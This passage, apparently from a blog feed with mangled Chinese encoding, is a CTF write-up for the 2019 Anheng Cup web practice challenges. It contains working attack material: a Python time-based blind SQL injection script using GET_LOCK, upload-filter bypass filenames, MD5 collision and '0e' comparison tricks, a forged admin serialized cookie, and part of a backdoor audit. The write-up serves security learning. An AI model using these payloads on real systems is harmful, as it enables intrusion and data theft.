src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571196848622.png" alt="1571196848622"></p></li></ol><p>å› æ­¤æœ‰payloadï¼š<code>/?A.A[]=1</code></p><h1 id="æ–°ç“¶è£…æ—§é…’"><a href="#æ–°ç“¶è£…æ—§é…’" class="headerlink" title="æ–°ç“¶è£…æ—§é…’"></a>æ–°ç“¶è£…æ—§é…’</h1><p>73-81è¡Œéœ€è¦ä¼ ä¸€ä¸ªåˆæ³•zipæ–‡ä»¶ï¼Œæ— æ³•ç»•è¿‡ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571211251759.png" alt="1571211251759"></p><p>æ¥ç€ï¼Œ92-105è¡Œè§£å‹zipï¼Œå¹¶ä¸”ç§»åŠ¨åˆ°uploadç›®å½•ä¸‹ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571211484309.png" alt="1571211484309"></p><p>è¦æ±‚zipä¸­å­˜åœ¨å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸åŒ…å«â€.phâ€å­—ç¬¦ï¼Œå¯ä»¥é€šè¿‡â€x.pHp.jpgâ€ç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571211770075.png" alt="1571211770075"></p><h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>æ•æ„Ÿè·¯å¾„æ‰«æï¼Œå‘ç°<code>/robots.txt</code>æ³„éœ²ï¼Œæ‰“å¼€å‘ç°æç¤º</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571199573631.png" alt="1571199573631"></p><p>ä»¥åŠæ³¨å…¥ç‚¹ <code>/article.php?id=2</code></p><p>è·‘é»‘åå•ï¼Œå‘ç°selectã€sleepå’Œbenchmarkéƒ½bannedï¼Œè§£æ³•æ˜¯é€šè¿‡GET_LOCK</p><blockquote><p>GET_LOCK(str,timeout)<br>Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.</p></blockquote><p>å› æ­¤å°è¯•<code>/article.php?id=2&#39; and (get_lock(&#39;vvvv&#39;,10)) #</code>å¯ä»¥æˆåŠŸå»¶æ—¶ï¼Œæ³¨æ„åˆ°åŒè¡¨åšåˆ—æŸ¥è¯¢æ—¶ä¸éœ€è¦ç”¨selectï¼Œå› æ­¤æœ‰å¦‚ä¸‹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleepcms</span><span class="params">()</span>:</span></span><br><span class="line">    base_url = <span class="string">"http://114.55.36.69:8007/article.php?id="</span></span><br><span class="line">    dic = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"1'/**/and/**/(if(substr(content,&#123;pos&#125;,1)='&#123;char&#125;',get_lock('nonce',3),0))/**/#"</span></span><br><span class="line">            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += str(i)</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sleepcms()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flagï¼š<code>flagis{Flag{C221e22A28b933f103f0f88caB68b79b}}</code>ï¼Œæ”¹æˆå°å†™æäº¤æœ€é‡Œé¢æ‹¬å·çš„å†…å®¹</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>è¦æ±‚<code>$_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])</code>ï¼Œå¼ºç½‘æ¯åŸé¢˜ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">å¦‚ä½•ç”¨ä¸åŒçš„æ•°å€¼æ„å»ºä¸€æ ·çš„MD5</a>ã€‚</p><p>æŒ‡å®šparam1å’Œparam2ç›¸åŒçš„å¼€å¤´ï¼Œè¿™é‡Œä»¥â€1â€ä¸ºä¾‹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;init.txt</span><br></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨fastcollç”Ÿæˆå…·æœ‰ç›¸åŒmd5çš„æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Î» fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">'1.txt'</span> and <span class="string">'2.txt'</span></span><br><span class="line">Using prefixfile: <span class="string">'init.txt'</span></span><br><span class="line">Using initial value: b012cf77f9677e37eea923017fc5e83e</span><br><span class="line"></span><br><span class="line">Generating first block: ..</span><br><span class="line">Generating second block: S00....</span><br><span class="line">Running time: 0.641 s</span><br></pre></td></tr></table></figure><p>å°†1.txtå’Œ2.txtå†…å®¹è¿›è¡Œç¼–ç åå‘é€å³å¯çš„å¾—åˆ°flagã€‚</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571140925389.png" alt="1571140925389"></p><p>æä¾›ä»£ç æ–¹ä¾¿å¤ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $text1=$_POST["data1"];</span></span><br><span class="line"><span class="comment">// $text2=$_POST["data2"];</span></span><br><span class="line"></span><br><span class="line">$text1=readmyfile(<span class="string">"1.txt"</span>);</span><br><span class="line">$text2=readmyfile(<span class="string">"2.txt"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD51: '</span>. md5($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode ($text1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD52: '</span>.md5($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode($text2));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ç®€å•çš„md5"><a href="#ç®€å•çš„md5" class="headerlink" title="ç®€å•çš„md5"></a>ç®€å•çš„md5</h1><p>è®¿é—®ç½‘ç«™æºä»£ç ï¼Œçœ‹åˆ°æç¤ºï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571131147272.png" alt="1571131147272"></p><p>å®é™…ä¸Šæ˜¯è¯´ï¼Œ<code>md5($_POST[&#39;data1&#39;])!=md5($_POST[&#39;data2&#39;])</code>ï¼Œç”±äºæ²¡ç”¨å…¨ç­‰ï¼Œç”¨<code>0e</code>ç»•è¿‡å³å¯ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571131226817.png" alt="1571131226817"></p><h1 id="ç§˜å¯†çš„ç³»ç»Ÿ"><a href="#ç§˜å¯†çš„ç³»ç»Ÿ" class="headerlink" title="ç§˜å¯†çš„ç³»ç»Ÿ"></a>ç§˜å¯†çš„ç³»ç»Ÿ</h1><h2 id="0x01-ä¿¡æ¯æ³„éœ²"><a href="#0x01-ä¿¡æ¯æ³„éœ²" class="headerlink" title="0x01 ä¿¡æ¯æ³„éœ²"></a>0x01 ä¿¡æ¯æ³„éœ²</h2><p>é¦–å…ˆï¼Œdirsearchå‘ç°æ³„éœ².idea/workspace.xmlæ–‡ä»¶ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571192815365.png" alt="1571192815365"></p><p>workspaceå‘ç°æ›´å¤šçš„æ–‡ä»¶ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571192935874.png" alt="1571192935874"></p><p>phpæ–‡ä»¶æœªå¿…èƒ½è®¿é—®ï¼Œçœ‹<code>/web/robots.txt</code>:</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193047923.png" alt="1571193047923"></p><p>è®¿é—®<code>/web/index.php?r=site/loginuser_1</code>å‘ç°æœ‰ä¸€æ®µæ³¨é‡Šï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193204265.png" alt="1571193204265"></p><p>åˆ°Githubæœç´¢å…³é”®è¯ï¼Œèƒ½çœ‹åˆ°æ›´å¤šçš„æç¤ºï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193458794.png" alt="1571193458794"></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193530702.png" alt="1571193530702"></p><h2 id="0x02-ååºåˆ—åŒ–å‚ç›´è¶Šæƒ"><a href="#0x02-ååºåˆ—åŒ–å‚ç›´è¶Šæƒ" class="headerlink" title="0x02 ååºåˆ—åŒ–å‚ç›´è¶Šæƒ"></a>0x02 ååºåˆ—åŒ–å‚ç›´è¶Šæƒ</h2><p>çœ‹æç¤ºå¤§æ¦‚æ˜¯è¦ç”¨ååºåˆ—åŒ–åšå‚ç›´è¶Šæƒäº†ï¼š</p><p>å…ˆæŠ“åŒ…ç™»å½•ï¼Œç„¶åcookieå­—æ®µè¢«å¡äº†ä¸€ä¸ªcibå­—æ®µ</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193790173.png" alt="1571193790173"></p><p>è€ƒè™‘åˆ°æ³¨é‡Šé‡Œé¢ï¼Œsignéœ€è¦çš„idï¼Œnameéƒ½æ˜¯å¯æ§çš„ï¼Œä¼ªé€ ä¸€ä¸ªadminçš„cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($id.$username),</span><br><span class="line">                );</span><br><span class="line"><span class="keyword">echo</span> serialize($sign);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°èº«ä»½å·²ç»æˆç®¡ç†å‘˜äº†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571194732400.png" alt="1571194732400"></p><p>åŠ ä¸€æ¡replaceç»™æµè§ˆå™¨ç”¨ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571194913710.png" alt="1571194913710"></p><h2 id="0x03-ä¸Šä¼ ç»•è¿‡"><a href="#0x03-ä¸Šä¼ ç»•è¿‡" class="headerlink" title="0x03 ä¸Šä¼ ç»•è¿‡"></a>0x03 ä¸Šä¼ ç»•è¿‡</h2><p>ç›´æ¥ä¸Šä¼ .phpä¼šè¢«banï¼Œè€ƒè™‘åˆ°å…¶å®¹å™¨ç”¨çš„Apache/2.2.15ï¼Œå­˜åœ¨è§£ææ¼æ´ï¼Œæ•…ä¸Šä¼ â€œ.php.jpgâ€</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571195205154.png" alt="1571195205154"></p><p>flagåœ¨æ ¹ç›®å½•ä¸‹ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571195383816.png" alt="1571195383816"></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>æ‰“å¼€é¡µé¢æ˜¯ä¸€ä¸ªè´ªåƒè›‡æ¸¸æˆï¼Œjså†™çš„ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571197503720.png" alt="1571197503720"></p><p><code>/js/game.js</code>ä»£ç å®¡è®¡ï¼Œçœ‹åˆ°ä¸€ä¸²é¢œæ–‡å­—ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571197561706.png" alt="1571197561706"></p><p>consoleè¿è¡Œï¼Œè¿”å›å‡flagï¼Œè·Ÿè¿›å»çœ‹åŒ¿åå‡½æ•°ï¼Œå¾—åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571197802703.png" alt="1571197802703"></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>2019å®‰æ’æ¯Webå®‰å…¨æµ‹è¯•å¤§èµ›ç»ƒä¹ èµ›writeupï¼Œ<a href="http://flag0.com/2019/09/27/2019å®‰æ’æ¯Webå®‰å…¨æµ‹è¯•å¤§èµ›ç»ƒä¹ èµ›Writeup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;çˆ±ã„çª’æ¯ã€ç—›&quot;&gt;&lt;a href=&quot;#çˆ±ã„çª’æ¯ã€ç—›&quot; class=&quot;headerlink&quot; title=&quot;çˆ±ã„çª’æ¯ã€ç—›&quot;&gt;&lt;/a&gt;çˆ±ã„çª’æ¯ã€ç—›&lt;/h1&gt;&lt;h2 id=&quot;0x01-è·¯å¾„éå†&quot;&gt;&lt;a href=&quot;#0x01-è·¯å¾„éå†&quot; class=&quot;headerlink&quot; title=&quot;0x01 è·¯å¾„éå†&quot;&gt;&lt;/a&gt;0x01 è·¯å¾„éå†&lt;/h2&gt;&lt;p&gt;æ‰“å¼€åœ°å€çœ‹åˆ°è·¯å¾„éå†ï¼š&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571126059065.png&quot; alt=&quot;1571126059065&quot;&gt;&lt;/p&gt;&lt;p&gt;åœ¨uploadæ–‡ä»¶å¤¹ä¸‹å‘ç°åé—¨å’Œå…¶æºç &lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571141073240.png&quot; alt=&quot;1571141073240&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571141089817.png&quot; alt=&quot;1571141089817&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;0x02-åé—¨å®¡è®¡&quot;&gt;&lt;a href=&quot;#0x02-åé—¨å®¡è®¡&quot; class=&quot;headerlink&quot; title=&quot;0x02 åé—¨å®¡è®¡&quot;&gt;&lt;/a&gt;0x02 åé—¨å®¡è®¡&lt;/h2&gt;&lt;p&gt;æ ¼å¼åŒ–åï¼Œè¿›è¡Œä»£ç å®¡è®¡&lt;/p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$a = &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&#39;pass&#39;&lt;/span&gt;]) ? trim($_POST[&lt;span class=&quot;string&quot;&gt;&#39;pass&#39;&lt;/span&gt;]) : &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($a == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    echologin();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chkpass($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    helloowner($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;chkpass&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($a)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// UAæ˜¯md5(POST[&#39;pass&#39;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stripos($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;HTTP_USER_AGENT&#39;&lt;/span&gt;], md5($a)) === &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echofail(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;helloowner&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($a)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// è¿™é‡Œäº§ç”Ÿä¸€ä¸ªurl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $b = gencodeurl($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// ä»urlè·å–æ–‡ä»¶å†…å®¹ï¼ŒSSRF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $c = file_get_contents($b);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($c == &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echofail(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $d = @json_decode($c, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($d[&lt;span class=&quot;string&quot;&gt;&#39;f&#39;&lt;/span&gt;])) 